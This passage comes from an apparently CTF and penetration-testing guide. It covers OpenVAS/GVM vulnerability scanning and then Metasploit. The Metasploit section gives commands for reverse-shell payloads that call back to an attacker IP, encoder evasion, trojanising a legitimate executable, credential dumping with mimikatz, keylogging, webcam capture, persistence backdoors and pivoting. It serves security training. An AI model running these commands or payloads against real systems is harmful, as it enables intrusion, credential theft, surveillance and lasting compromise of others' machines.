- PDF: Standard report format
- Text: Plain text output
- TXT: Simple text format
- XML: Full data export

# Recommended for CTF:
- PDF: Quick review
- XML: Automated parsing
- CSV: Data analysis
```

### Advanced Configuration

**Creating custom scan configurations:**

```bash
# Navigate: Configuration > Scan Configs > New Scan Config

# Base on existing config
1. Select base (e.g., "Full and fast")
2. Clone and modify

# NVT Family selection:
Enable/disable entire families:
- Brute force attacks
- Buffer overflow
- Compliance
- Credentials
- Databases
- Default Accounts
- Denial of Service
- FTP
- Finger abuses
- Gain a shell remotely
- General
- Malware
- NMAP NSE
- Port scanners
- Privilege escalation
- Product detection
- RPC
- Remote file access
- SMTP problems
- SNMP
- Service detection
- Settings
- SSL and TLS
- Web Servers
- Web application abuses
- Windows

# Individual NVT selection:
# Expand family to enable/disable specific tests
```

**Credential configuration:**

```bash
# Navigate: Configuration > Credentials > New Credential

# Credential types:
Username + Password:
  - Type: Username + Password
  - Username: admin
  - Password: password123
  - Privilege: Use for authentication

Username + SSH Key:
  - Type: Username + SSH Key
  - Username: root
  - Passphrase: (if key encrypted)
  - Private Key: [paste or upload]

SNMP:
  - Type: SNMP
  - Community: public/private
  - Authentication password: (for SNMPv3)
  - Privacy password: (for SNMPv3)

Windows (SMB):
  - Type: Username + Password
  - Username: Administrator
  - Password: password

# Assign credentials to target:
# Configuration > Targets > Edit Target
# Select credentials for each service type
```

**Port list management:**

```bash
# Navigate: Configuration > Port Lists

# Predefined lists:
All IANA assigned TCP:
  - 33,000+ ports
  - Very slow

All TCP and Nmap top 100 UDP:
  - Common compromise
  - Faster than all ports

All TCP:
  - Ports 1-65535 TCP
  - Thorough but time-consuming

Nmap top 2000 TCP and top 100 UDP:
  - Most common ports
  - Good balance

# Create custom port list:
1. Click New Port List
2. Specify ports:
   - Range: 1-1000
   - Individual: 22,80,443,3306,8080
   - Mix: 1-1000,3306,8080-8090
3. Specify protocol: TCP/UDP
```

### Command-Line Interface

**GVM daemon (gvmd) commands:**

```bash
# User management
sudo gvmd --create-user=newuser --password=password123
sudo gvmd --user=newuser --new-password=newpass456
sudo gvmd --get-users
sudo gvmd --delete-user=olduser

# Set user role
sudo gvmd --user=newuser --new-role=Admin

# Feed status
sudo gvmd --get-feeds

# Database management
sudo gvmd --rebuild  # Rebuild database
sudo gvmd --optimize=vacuum  # Optimize database
```

**OSP scanner (ospd-openvas) commands:**

```bash
# Start scanner
sudo systemctl start ospd-openvas

# Check scanner status
sudo systemctl status ospd-openvas

# View scanner socket
sudo ss -tulpn | grep ospd

# Reload VTs (Vulnerability Tests)
sudo systemctl reload ospd-openvas
```

**Feed synchronization commands:**

```bash
# Sync all feeds
sudo greenbone-feed-sync

# Sync specific feed
sudo greenbone-nvt-sync  # Network Vulnerability Tests
sudo greenbone-scapdata-sync  # SCAP data
sudo greenbone-certdata-sync  # CERT data

# Check sync status
sudo gvm-check-setup | grep -i feed

# Force update
sudo greenbone-feed-sync --type GVMD_DATA --force
```

### CTF and Penetration Testing Workflows

**Quick reconnaissance scan:**

```bash
# Workflow for fast CTF recon:

# Step 1: Create target
Configuration > Targets > New
- Name: CTF_Target
- Hosts: 10.10.10.50
- Port List: Nmap top 2000 TCP and top 100 UDP

# Step 2: Create task
Scans > Tasks > New
- Name: Quick_Recon
- Target: CTF_Target
- Scan Config: Discovery
- Scanner: OpenVAS Default

# Step 3: Run and analyze
- Start scan
- Review discovered services
- Identify potential entry points

# Expected duration: 5-10 minutes
```

**Deep vulnerability assessment:**

```bash
# Comprehensive scan workflow:

# Step 1: Discovery scan (as above)
# Step 2: Create credentialed target
# Add SSH/SMB credentials if available

# Step 3: Full vulnerability scan
- Scan Config: Full and fast
- Schedule: Immediate
- Enable optimize: Yes

# Step 4: Analyze high-severity findings
# Focus on:
- Remote code execution
- Privilege escalation
- Default credentials
- Unpatched services

# Expected duration: 30-90 minutes per host
```

**Extracting exploitable vulnerabilities:**

```python
#!/usr/bin/env python3
# Parse OpenVAS XML report for high-value targets

import xml.etree.ElementTree as ET

def parse_openvas_xml(xml_file):
    """Extract high/critical vulnerabilities from OpenVAS XML"""
    
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    exploitable = []
    
    # Find all results
    for result in root.findall('.//result'):
        threat = result.find('threat')
        if threat is not None and threat.text in ['High', 'Critical']:
            
            vuln = {
                'host': result.find('host').text if result.find('host') is not None else 'N/A',
                'port': result.find('port').text if result.find('port') is not None else 'N/A',
                'severity': result.find('severity').text if result.find('severity') is not None else 'N/A',
                'threat': threat.text,
                'name': result.find('name').text if result.find('name') is not None else 'N/A',
            }
            
            # Extract CVEs
            description = result.find('description')
            if description is not None and 'CVE' in description.text:
                import re
                cves = re.findall(r'CVE-\d{4}-\d+', description.text)
                vuln['cves'] = cves
            
            exploitable.append(vuln)
    
    return exploitable

# Usage
vulns = parse_openvas_xml('openvas_report.xml')
for vuln in sorted(vulns, key=lambda x: float(x.get('severity', 0)), reverse=True):
    print(f"[{vuln['threat']}] {vuln['host']}:{vuln['port']} - {vuln['name']}")
    if 'cves' in vuln:
        print(f"  CVEs: {', '.join(vuln['cves'])}")
```

**Automated scanning script:**

```bash
#!/bin/bash
# Automated OpenVAS scanning script

TARGET_IP="$1"
SCAN_NAME="Auto_Scan_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[*] Starting automated OpenVAS scan"
echo "[*] Target: $TARGET_IP"

# Note: Requires gvm-tools for CLI interaction
# Install: pip3 install gvm-tools

# Create target via gvm-cli
gvm-cli socket --xml "<create_target><name>$SCAN_NAME</name><hosts>$TARGET_IP</hosts></create_target>"

# Create and start task
# (Full implementation requires gvm-tools and proper authentication)

echo "[*] Scan initiated. Monitor via web interface."
```

### Integration and Automation

**Using GVM-Tools (Python library):**

```bash
# Install gvm-tools
pip3 install gvm-tools

# Basic Python interaction
python3 << 'EOF'
from gvm.connections import UnixSocketConnection
from gvm.protocols.gmp import Gmp
from gvm.transforms import EtreeTransform

# Connect to GVM
connection = UnixSocketConnection()
transform = EtreeTransform()

with Gmp(connection=connection, transform=transform) as gmp:
    # Authenticate
    gmp.authenticate('admin', 'password')

# Get version
version = gmp.get_version()
print(f"GVM Version: {version.get('version')}")

# List tasks
tasks = gmp.get_tasks()
for task in tasks.xpath('task'):
    name = task.find('name').text
    status = task.find('status').text
    print(f"Task: {name} - Status: {status}")

# Create target
target_response = gmp.create_target(
    name='API_Target',
    hosts=['192.168.1.100']
)
target_id = target_response.get('id')
print(f"Created target: {target_id}")

# Create task
config_id = 'daba56c8-73ec-11df-a475-002264764cea'  # Full and fast
scanner_id = '08b69003-5fc2-4037-a479-93b440211c73'  # OpenVAS Default

task_response = gmp.create_task(
    name='API_Scan',
    config_id=config_id,
    target_id=target_id,
    scanner_id=scanner_id
)
task_id = task_response.get('id')
print(f"Created task: {task_id}")

# Start task
gmp.start_task(task_id)
print("Task started")

EOF
````

**Automated scanning with gvm-tools:**

```python
#!/usr/bin/env python3
"""
Automated OpenVAS scanning script
"""

from gvm.connections import UnixSocketConnection
from gvm.protocols.gmp import Gmp
from gvm.transforms import EtreeTransform
import time
import sys

def create_and_run_scan(target_hosts, scan_name):
    """Create target, task, and run scan"""
    
    connection = UnixSocketConnection()
    transform = EtreeTransform()
    
    with Gmp(connection=connection, transform=transform) as gmp:
        # Authenticate
        gmp.authenticate('admin', 'your_password')
        
        print(f"[*] Creating target for {target_hosts}")
        
        # Create target
        target = gmp.create_target(
            name=f"{scan_name}_target",
            hosts=target_hosts,
            port_list_id='33d0cd82-57c6-11e1-8ed1-406186ea4fc5'  # All IANA TCP
        )
        target_id = target.get('id')
        print(f"[+] Target created: {target_id}")
        
        # Get scan config ID (Full and fast)
        config_id = 'daba56c8-73ec-11df-a475-002264764cea'
        
        # Get default scanner ID
        scanner_id = '08b69003-5fc2-4037-a479-93b440211c73'
        
        # Create task
        print("[*] Creating scan task")
        task = gmp.create_task(
            name=scan_name,
            config_id=config_id,
            target_id=target_id,
            scanner_id=scanner_id
        )
        task_id = task.get('id')
        print(f"[+] Task created: {task_id}")
        
        # Start task
        print("[*] Starting scan...")
        gmp.start_task(task_id)
        print("[+] Scan started successfully")
        
        # Monitor progress
        while True:
            task_status = gmp.get_task(task_id)
            status = task_status.find('.//status').text
            progress = task_status.find('.//progress').text
            
            print(f"\r[*] Status: {status} - Progress: {progress}%", end='')
            
            if status == 'Done':
                print("\n[+] Scan completed!")
                break
            elif status in ['Stopped', 'Interrupted']:
                print(f"\n[!] Scan {status}")
                break
            
            time.sleep(30)  # Check every 30 seconds
        
        # Get report
        report_id = task_status.find('.//last_report/report').get('id')
        print(f"[*] Report ID: {report_id}")
        
        # Export report
        report = gmp.get_report(
            report_id=report_id,
            report_format_id='a994b278-1f62-11e1-96ac-406186ea4fc5'  # XML
        )
        
        # Save to file
        filename = f"{scan_name}_report.xml"
        with open(filename, 'wb') as f:
            f.write(report)
        
        print(f"[+] Report saved to {filename}")
        
        return task_id, report_id

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_hosts> <scan_name>")
        print(f"Example: {sys.argv[0]} 192.168.1.0/24 Network_Scan")
        sys.exit(1)
    
    target = sys.argv[1]
    name = sys.argv[2]
    
    create_and_run_scan([target], name)
````

**Parsing results for exploitation:**

```python
#!/usr/bin/env python3
"""
Parse OpenVAS results and identify exploitable vulnerabilities
"""

import xml.etree.ElementTree as ET
import re

def parse_exploitable_vulns(xml_file):
    """Extract vulnerabilities with known exploits"""
    
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    exploitable = []
    
    for result in root.findall('.//result'):
        # Get severity
        severity_elem = result.find('severity')
        if severity_elem is None:
            continue
        
        try:
            severity = float(severity_elem.text)
        except (ValueError, TypeError):
            continue
        
        # Focus on high severity (>= 7.0)
        if severity < 7.0:
            continue
        
        # Extract details
        host = result.find('host').text if result.find('host') is not None else 'Unknown'
        port = result.find('port').text if result.find('port') is not None else 'Unknown'
        name = result.find('name').text if result.find('name') is not None else 'Unknown'
        
        description_elem = result.find('description')
        description = description_elem.text if description_elem is not None else ''
        
        # Look for exploit indicators
        exploit_keywords = [
            'metasploit', 'exploit', 'remote code execution',
            'arbitrary command', 'shell', 'backdoor'
        ]
        
        has_exploit_indicator = any(
            keyword in description.lower() or keyword in name.lower()
            for keyword in exploit_keywords
        )
        
        # Extract CVEs
        cves = re.findall(r'CVE-\d{4}-\d+', description)
        
        vuln_info = {
            'host': host,
            'port': port,
            'severity': severity,
            'name': name,
            'cves': cves,
            'likely_exploitable': has_exploit_indicator
        }
        
        exploitable.append(vuln_info)
    
    # Sort by severity
    exploitable.sort(key=lambda x: x['severity'], reverse=True)
    
    return exploitable

def print_results(vulnerabilities):
    """Print formatted results"""
    
    print("\n" + "="*80)
    print("HIGH SEVERITY VULNERABILITIES")
    print("="*80 + "\n")
    
    for i, vuln in enumerate(vulnerabilities, 1):
        print(f"[{i}] {vuln['name']}")
        print(f"    Host: {vuln['host']}")
        print(f"    Port: {vuln['port']}")
        print(f"    Severity: {vuln['severity']}")
        
        if vuln['cves']:
            print(f"    CVEs: {', '.join(vuln['cves'])}")
        
        if vuln['likely_exploitable']:
            print(f"    *** LIKELY EXPLOITABLE ***")
        
        print()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <openvas_report.xml>")
        sys.exit(1)
    
    vulns = parse_exploitable_vulns(sys.argv[1])
    print_results(vulns)
    
    # Save to CSV
    import csv
    with open('exploitable_vulns.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['host', 'port', 'severity', 'name', 'cves', 'likely_exploitable'])
        writer.writeheader()
        writer.writerows(vulns)
    
    print(f"[+] Saved {len(vulns)} vulnerabilities to exploitable_vulns.csv")
```

### Performance Tuning

**Optimizing scan performance:**

```bash
# Adjust scanner preferences
# Configuration > Scan Configs > Edit Config > Preferences

# Key settings:
Network:
- Timeout: 300 seconds (increase for slow networks)
- Max hosts: 20 (concurrent hosts scanned)
- Max checks: 4 (concurrent checks per host)

Port Scanner:
- TCP scanning technique: SYN scan (faster)
- UDP port scanning: Disabled (unless needed)

Performance:
- Auto-optimize: Yes
- Optimize test: Yes

# Database optimization
sudo -u postgres vacuumdb --all --analyze

# Redis optimization (NVT cache)
sudo systemctl restart redis-server@openvas
```

**Reducing false positives:**

```bash
# Enable safe checks
# Avoid aggressive DoS tests

# Configuration > Scan Configs
# Disable families:
- Denial of Service (unless specifically needed)
- Brute force attacks (can be noisy)

# Review detected OS/services
# Cross-reference with manual enumeration
```

### Troubleshooting

**Common issues and solutions:**

```bash
# Issue: Feed sync fails
# Solution:
sudo greenbone-feed-sync --type GVMD_DATA --verbose
# Check internet connectivity
# Verify disk space: df -h

# Issue: Scanner not responding
# Solution:
sudo systemctl restart ospd-openvas
sudo systemctl restart gvmd
# Check logs: sudo journalctl -u ospd-openvas -f

# Issue: Web interface not accessible
# Solution:
sudo systemctl restart gsad
sudo netstat -tlnp | grep 9392
# Verify firewall: sudo ufw allow 9392

# Issue: Scans stuck at 0%
# Solution:
# Verify target is reachable: ping <target>
# Check scanner is running: ps aux | grep openvas
# Review task details for error messages

# Issue: High CPU/memory usage
# Solution:
# Reduce concurrent checks
# Lower max hosts per scan
# Increase scan interval
# Monitor: top, htop

# Database rebuild (last resort)
sudo gvmd --rebuild
```

**Logs location:**

```bash
# Main logs
/var/log/gvm/gvmd.log        # GVM daemon
/var/log/gvm/openvas.log     # Scanner logs
/var/log/gvm/gsad.log        # Web interface

# View in real-time
sudo tail -f /var/log/gvm/*.log

# Search for errors
sudo grep -i error /var/log/gvm/*.log
sudo grep -i failed /var/log/gvm/*.log
```

---

## Metasploit Framework

### Overview

Metasploit Framework (MSF) is a comprehensive penetration testing platform for developing, testing, and executing exploit code against remote targets. It contains thousands of exploits, payloads, auxiliary modules, and post-exploitation tools.

### Installation and Setup

**Installing Metasploit on Kali Linux:**

```bash
# Metasploit is pre-installed on Kali Linux
# Update to latest version
sudo apt update
sudo apt install metasploit-framework

# Initialize database
sudo msfdb init

# Check database status
sudo msfdb status

# Start PostgreSQL if not running
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Reinitialize database (if issues)
sudo msfdb delete
sudo msfdb init
```

**Starting Metasploit:**

```bash
# Launch console
msfconsole

# With quiet mode (no banner)
msfconsole -q

# Load specific resource script
msfconsole -r script.rc

# Execute single command
msfconsole -x "use exploit/multi/handler"
```

**Initial configuration:**

```bash
# Inside msfconsole

# Check database connection
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# Create workspace
msf6 > workspace -a ctf_challenge
[*] Added workspace: ctf_challenge

# List workspaces
msf6 > workspace
  default
* ctf_challenge

# Switch workspace
msf6 > workspace default

# Check for updates
msf6 > msfupdate
```

### Basic Commands and Navigation

**Essential commands:**

```bash
# Help system
msf6 > help
msf6 > help search
msf6 > help use

# Search for modules
msf6 > search smb
msf6 > search type:exploit platform:windows
msf6 > search cve:2017 rank:excellent
msf6 > search eternalblue

# Select module
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >

# Show module information
msf6 exploit(...) > info
msf6 exploit(...) > show options
msf6 exploit(...) > show payloads
msf6 exploit(...) > show targets
msf6 exploit(...) > show advanced

# Set options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 445
msf6 exploit(...) > set LHOST 192.168.1.50

# Set global options
msf6 > setg LHOST 192.168.1.50
msf6 > setg RHOSTS 192.168.1.0/24

# Unset options
msf6 exploit(...) > unset RHOSTS
msf6 exploit(...) > unsetg LHOST

# Run exploit
msf6 exploit(...) > exploit
msf6 exploit(...) > run

# Background session
Ctrl+Z or background command

# Return to previous context
msf6 exploit(...) > back
msf6 >
```

**Search operators:**

```bash
# Search by type
msf6 > search type:exploit
msf6 > search type:auxiliary
msf6 > search type:post
msf6 > search type:payload

# Search by platform
msf6 > search platform:windows
msf6 > search platform:linux
msf6 > search platform:php

# Search by CVE
msf6 > search cve:2021
msf6 > search cve:2021-44228  # Log4Shell

# Search by rank
msf6 > search rank:excellent
msf6 > search rank:great
# Ranks: manual, low, average, normal, good, great, excellent

# Combined searches
msf6 > search type:exploit platform:windows rank:excellent
msf6 > search apache type:auxiliary
msf6 > search mysql cve:2012

# Search by name
msf6 > search name:struts
msf6 > search name:tomcat
```

### Module Types

**Exploit modules:**

```bash
# Execute code on target systems
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > use exploit/multi/http/struts2_content_type_ognl

# Show exploit info
msf6 exploit(...) > info

# Key fields:
- Name: Exploit identifier
- Platform: Target OS/platform
- Arch: Target architecture
- Privileged: Requires admin/root
- Targets: Compatible target versions
- Available ranks: Reliability rating
- Default target: Auto-selected target
```

**Auxiliary modules:**

```bash
# Non-exploit tasks: scanning, fuzzing, sniffing

# Port scanning
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PORTS 21,22,80,443,3306
msf6 > run

# Service version detection
msf6 > use auxiliary/scanner/http/http_version
msf6 > set RHOSTS 192.168.1.100
msf6 > run

# SMB enumeration
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 > use auxiliary/scanner/smb/smb_enumusers

# Brute forcing
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 192.168.1.100
msf6 > set USERNAME root
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run

# Database scanning
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 > use auxiliary/scanner/mssql/mssql_login
```

**Payload modules:**

```bash
# Code executed on target after exploitation

# List available payloads for current exploit
msf6 exploit(...) > show payloads

# Common payload types:
Singles: Self-contained, single payload
Stagers: Small payload that downloads full payload
Stages: Full payload downloaded by stager

# Reverse shells (target connects back)
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp

# Bind shells (attacker connects to target)
windows/meterpreter/bind_tcp
linux/x86/shell/bind_tcp

# Set payload
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
```

**Post-exploitation modules:**

```bash
# Run after gaining access

# Privilege escalation
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

# Credential harvesting
msf6 > use post/windows/gather/hashdump
msf6 > use post/linux/gather/hashdump
msf6 > use post/windows/gather/credentials/credential_collector

# Persistence
msf6 > use post/windows/manage/persistence_exe
msf6 > use post/linux/manage/sshkey_persistence

# Lateral movement
msf6 > use post/windows/gather/enum_domain
msf6 > use post/windows/gather/enum_logged_on_users
```

### Payloads and Handlers

**Generating standalone payloads with msfvenom:**

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Java reverse shell
msfvenom -p java/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f jar -o shell.jar

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.py

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f asp -o shell.asp

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f war -o shell.war
```

**Encoding and evasion:**

```bash
# Encode payload to evade detection
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o encoded_shell.exe

# Multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -e x86/call4_dword_xor \
  -f exe -o multi_encoded.exe

# List available encoders
msfvenom --list encoders

# Common encoders:
# - x86/shikata_ga_nai (excellent)
# - x86/fnstenv_mov (good)
# - x86/jmp_call_additive (normal)
# - cmd/powershell_base64 (for command injection)

# Template injection
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -x legitimate_app.exe \
  -k \
  -f exe -o trojan.exe
```

**Setting up multi/handler:**

```bash
# Catch incoming connections from payloads
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j  # Run as job

# For multiple sessions
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j -z

# List active jobs
msf6 > jobs -l

# Kill job
msf6 > jobs -k 0
```

### Session Management

**Working with sessions:**

```bash
# List active sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i 1

# Background session
meterpreter > background
# Or press Ctrl+Z

# Kill session
msf6 > sessions -k 1

# Kill all sessions
msf6 > sessions -K

# Run command on session without interaction
msf6 > sessions -C "sysinfo" -i 1

# Upgrade shell to meterpreter
msf6 > sessions -u 1
```

**Session types:**

```bash
# Meterpreter session
- Advanced post-exploitation features
- In-memory execution
- No disk writes
- Commands: help, sysinfo, getuid, hashdump

# Shell session
- Basic command shell
- OS-native commands
- Less features than Meterpreter
- Upgrade: sessions -u <id>

# Upgrade shell to meterpreter manually
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(...) > set SESSION 1
msf6 post(...) > run
```

### Meterpreter Commands

**Basic system commands:**

```bash
# System information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps

# File system navigation
meterpreter > pwd
meterpreter > cd C:\\Users\\Administrator
meterpreter > ls
meterpreter > cat file.txt
meterpreter > download file.txt /root/
meterpreter > upload /root/tool.exe C:\\Temp\\

# Search for files
meterpreter > search -f *.txt
meterpreter > search -f flag.txt -d C:\\
meterpreter > search -f *.config -d C:\\inetpub\\
```

**Process management:**

```bash
# List processes
meterpreter > ps

# Migrate to process
meterpreter > migrate 1234

# Kill process
meterpreter > kill 1234

# Execute program
meterpreter > execute -f cmd.exe -i
meterpreter > execute -f notepad.exe -H  # Hidden

# Get current process info
meterpreter > getpid
```

**Privilege escalation:**

```bash
# Attempt automatic privilege escalation
meterpreter > getsystem

# Methods:
# - Named pipe impersonation
# - Token duplication
# - Named pipe impersonation (RPCSS variant)

# Check current privileges
meterpreter > getprivs

# If getsystem fails, use exploit suggester
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run
```

**Credential dumping:**

```bash
# Dump password hashes (requires SYSTEM)
meterpreter > hashdump

# Load mimikatz (Windows)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Dump credentials from memory
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Golden ticket (domain admin required)
meterpreter > golden_ticket_create
```

**Network operations:**

```bash
# Show network interfaces
meterpreter > ifconfig
meterpreter > ipconfig

# Show routing table
meterpreter > route

# Add route for pivoting
meterpreter > run autoroute -s 10.10.10.0/24

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389

# ARP scanner
meterpreter > run arp_scanner -r 192.168.1.0/24
```

**Persistence:**

```bash
# Install persistent backdoor
meterpreter > run persistence -X -i 60 -p 4445 -r 192.168.1.50

# Options:
# -X: Start on boot
# -i: Callback interval (seconds)
# -p: Port
# -r: Attacker IP

# Registry persistence
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Updater -d "C:\\backdoor.exe"

# Scheduled task persistence
meterpreter > execute -f schtasks -a "/create /tn Update /tr C:\\backdoor.exe /sc daily /st 09:00"
```

**Reconnaissance:**

```bash
# Screenshot
meterpreter > screenshot

# Webcam
meterpreter > webcam_list
meterpreter > webcam_snap

# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Enumerate users
meterpreter > run post/windows/gather/enum_logged_on_users

# Enumerate shares
meterpreter > run post/windows/gather/enum_shares

# Enumerate applications
meterpreter > run post/windows/gather/enum_applications

# Check for VM
meterpreter > run post/windows/gather/checkvm
```

### Database Integration

**Using workspace and database:**

```bash
# Create workspace
msf6 > workspace -a pentest_2025

# Import scan results
msf6 > db_import nmap_scan.xml
msf6 > db_import nessus_scan.nessus

# View database contents
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > creds
msf6 > loot

# Add host manually
msf6 > db_create_host -a 192.168.1.100

# Search database
msf6 > hosts -S 192.168.1
msf6 > services -p 445
msf6 > services -s http

# Target from database
msf6 > hosts -R  # Set RHOSTS to all hosts
msf6 > services -p 80 -R  # Set RHOSTS to hosts with port 80
```

**Nmap integration:**

```bash
# Run nmap from msfconsole
msf6 > db_nmap -sV -sC 192.168.1.100
msf6 > db_nmap -p- --open 192.168.1.0/24

# Results automatically imported to database

# Use database for targeting
msf6 > services -p 445 -R
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > run
```

### Pivoting and Post-Exploitation

**Setting up pivots:**

```bash
# Method 1: Autoroute
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p  # Print routes

meterpreter > background
msf6 > route print

# Now can attack 10.10.10.0/24 network through compromised host

# Method 2: Manual route
msf6 > route add 10.10.10.0/24 1  # Session 1

# Use proxy chains for tools outside MSF
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 4a
msf6 auxiliary(socks_proxy) > run -j

# Configure /etc/proxychains4.conf
# socks4 127.0.0.1 1080

# Use with external tools
proxychains nmap -sT -Pn 10.10.10.5
proxychains firefox
```

**Port forwarding for access:**

```bash
# Forward internal service to attacker machine
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5

# Now access http://127.0.0.1:8080 to reach 10.10.10.5:80

# List forwards
meterpreter > portfwd list

# Delete forward
meterpreter > portfwd delete -l 8080

# Reverse port forward
meterpreter > portfwd add -R -l 3389 -p 3389 -L 192.168.1.50
```

### Exploit Development and Customization

**Creating resource scripts (.rc):**

```bash
# Save commands to file
cat > auto_exploit.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j -z
EOF

# Run resource script
msfconsole -r auto_exploit.rc

# Or from within msfconsole: msf6 > resource auto_exploit.rc
````

**Multi-target automation:**

```bash
# Create script for multiple targets
cat > multi_scan.rc << 'EOF'
workspace -a multi_target_scan
db_nmap -sV -p 80,443,445,3389 192.168.1.0/24

services -p 445 -R
use auxiliary/scanner/smb/smb_version
run

services -p 80,443 -R
use auxiliary/scanner/http/http_version
run

services -p 3389 -R
use auxiliary/scanner/rdp/rdp_scanner
run
EOF

msfconsole -r multi_scan.rc
````

**Custom module development:**

```ruby
# Location: ~/.msf4/modules/exploits/custom/
# Or: /usr/share/metasploit-framework/modules/exploits/

# Basic exploit template
cat > ~/.msf4/modules/exploits/custom/example_exploit.rb << 'EOF'
##
# Custom Exploit Module
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Example Vulnerability Exploit',
      'Description'    => %q{
        This module exploits a vulnerability in Example Application
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2025-12345'],
          ['URL', 'http://example.com/advisory']
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X64,
      'Targets'        =>
        [
          ['Automatic', { }]
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2025-01-01',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/'])
      ])
  end

  def check
    # Check if target is vulnerable
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'version.php')
    })

    if res && res.body =~ /Vulnerable Version/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # Exploitation logic
    print_status("Exploiting #{rhost}:#{rport}")
    
    payload_data = generate_payload_data()
    
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'upload.php'),
      'data'   => payload_data
    })

    if res && res.code == 200
      print_good("Exploit successful!")
    else
      fail_with(Failure::Unknown, "Exploit failed")
    end
  end

  def generate_payload_data
    # Custom payload generation
    return "exploit_code_here"
  end
end
EOF

# Reload modules
msf6 > reload_all
```

**Auxiliary module template:**

```ruby
# Scanner module example
cat > ~/.msf4/modules/auxiliary/scanner/custom/example_scanner.rb << 'EOF'
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
